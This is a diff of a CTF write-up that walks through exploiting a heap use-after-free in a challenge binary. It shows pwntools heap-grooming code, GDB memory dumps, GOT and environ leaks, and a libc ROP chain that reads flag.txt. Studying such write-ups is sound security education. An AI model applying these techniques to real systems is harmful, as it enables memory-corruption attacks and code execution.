@@ -76,7 +76,7 @@ void free_safe_string(int i)
 
 Use-After-Free (UAF).  The bug here is NOT resetting the pointers to NULL.  Given how the heap reuses freed space we can create new garbage for old pointers.
 
-> There will be other write ups that cover mathematically exactly how this works, you may read terms like _fastbins_ or _tcachebins_ or _chunks_, etc... but not here, we're going to write garbage, free garbage, and write garbage and see what we can see.
+> There will be other write ups that cover mathematically exactly how this works, you may read terms like _fastbins_ or _tcachebins_ or _chunks_, etc... but not here, not today; we're going to write garbage, free garbage, and then write some more garbage and see what we can see.
 
 
 ### Dumpster Diving
@@ -92,7 +92,7 @@ typedef struct {
 
 `malloc` is called again to allocate space for the string.
 
-In many/most of these type of CTF challenges you usually end up creating 10 or so allocations, freeing them, then creating a larger one that can write to previously allocated memory with pointers we want to control that have existing pointers pointing to them.  Which is precisely the case here:
+In many of these type of CTF challenges you usually end up creating 10 or so allocations, freeing them, then creating a larger one that can write to previously allocated memory with pointers we want to control that have existing pointers pointing to them.  Which is precisely the case here:
 
 ```python
 for i in range(10): create(i, 0x80, b'')
@@ -100,7 +100,11 @@ for i in range(10): free(i)
 create(0, 0x100, cyclic(0x100))
 ```
 
-The above code will allocate 10 `safe_string` structures on the heap.  Each pointing to a `0x80` byte string (also allocated on the heap).  The pointers to the structs are in the BSS.
+The above code will:
+
+* Allocate 10 `safe_string` structures on the heap.  Each pointing to a `0x80` byte string (also allocated on the heap).
+* `free` all 10, however leaving the pointer array `data_storage` unchanged.
+* Create another allocation at index 0 with a `0x100` byte string of cyclic garbage.  Existing pointers (`data_storage` in the BSS segment) from the first loop will pointing at some of our garbage.
 
 > Details on this code is in the Exploit section below, for now, just go with it...
 
@@ -115,7 +119,7 @@ gef➤  x/10g &data_storage
 0x404080 <data_storage+64>:	0x5555557f7c40	0x5555557f7cf0
 ```
 
-`data_storage` is an array of pointers pointing to the allocated `safe_string` structs in the heap.  Because of the bug(s) not setting the pointers to `NULL` on `free`, we have 10 pointers we can explore.  The first:
+`data_storage` is an array of pointers pointing to the allocated `safe_string` structs on the heap.  Because of the bug(s) not setting the pointers to `NULL` on `free`, we have 10 pointers we can explore.  The first (zeroth):
 
 ```
 gef➤  x/2gx 0x5555557f7ae0
@@ -123,6 +127,8 @@ gef➤  x/2gx 0x5555557f7ae0
 ```
 
 This looks correct for index 0.  The first 8 bytes is the size we requested in the `create(0, 0x100, cyclic(0x100))` statement.  The second 8 bytes is the pointer to the cyclic generated string:
+
+> The astute may notice that the index 0 `string` pointer is pointing to the index 7 `safe_string` structure.
 
 ```
 gef➤  x/1s 0x00005555557f7b90
@@ -149,7 +155,7 @@ gef➤  x/1s 0x5555557f7b90
 0x5555557f7b90:	"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac"
 ```
 
-Yeah, looks like our text, and at the beginning as well.  So, we can simply just write out an 8-byte length and 8-byte address to index 0 as its string, and then use the program read and write menu options with index 7 to read and _write_ _what_ we want, _where_ we want.
+Yeah, looks like our text, and at the beginning as well.  So, we can simply just write out an 8-byte length and an 8-byte address to index 0 as its `string`, and then use the program read and write menu options with index 7 to read and _write_ _what_ we want, _where_ we want.
 
 That's all we really needed.  Next step would be to write out a size of `6` with `binary.got.puts` as the address, then read it from the program menu to leak libc.  With that in hand, do it again, but this time with `libc.sym.environ` to get a stack leak.  From there we can compute the distance in GDB from the environment to the return address on the stack.  And with that location known, well we just write out a ROP chain.
 
@@ -255,6 +261,7 @@ pop_rdx_r12 = libc.search(asm('pop rdx; pop r12; ret')).__next__()
 xchg_eax_edi = libc.search(asm('xchg eax, edi; ret')).__next__()
 
 rop  = b''
+
 rop += p64(pop_rdi)
 rop += p64(return_address + 0x200) # will put flag.txt and end of our payload)
 rop += p64(pop_rsi)
@@ -298,15 +305,17 @@ Finally, our ROP chain.  Since we have libc, we have all the gadgets we could ev
 
 If you're wondering why `pop rdx; pop r12` vs. just `pop rdx`, well that code above to find gadgets is not very smart and will find in most glibcs `pop rdx` in a non-executable section.  So I usually search for `pop rdx; pop r12`.
 
-The `xchg eax, edi` gadget is used to set `rdi` with the FD returned by `open`.
+The `xchg eax, edi` gadget is used to set `rdi` with the FD (`eax`) returned by `open`.
 
-The ROP chain above has 3 sections, open [the flag], read [the flag and store down stack], write [the flag to stdout].
+> _Why not use `mov`?_ Well, there's wasn't a simple gadget for that.
 
-After the `open` call the file descriptor (FD), needs to be passed to `read`, hence the `xchg`, however most of the time you can just hard code it to `3` or `4` depending on the challenge.  But hard coding sucks.
+The ROP chain above has 3 sections, `open` [the flag], `read` [the flag and store down stack], `write` [the flag to stdout].
+
+After the `open` call, the file descriptor (FD) needs to be passed to `read`, hence the `xchg`, however most of the time you can just hard code it to `3` or `4` depending on the challenge, but hard-coding sucks.
 
 The `read` and `write` sections should be easy to understand.
 
-Unsure of how long the ROP chain was going to be while developing it I set the flag file name to be `0x200` bytes down stack.  And just appended to the ROP chain with cyclic padding.  Also down stack is the scratch space for storing the flag after `read`.
+Unsure of how long the ROP chain was going to be while developing it, so I set the flag file name to be `0x200` bytes down stack, then just appended to the ROP chain with cyclic padding.  Also down stack is the scratch space for storing the flag after `read`.
 
 It's basically the same cycle as before, write to index 0 the length and address followed by a read or write using index 7.
 
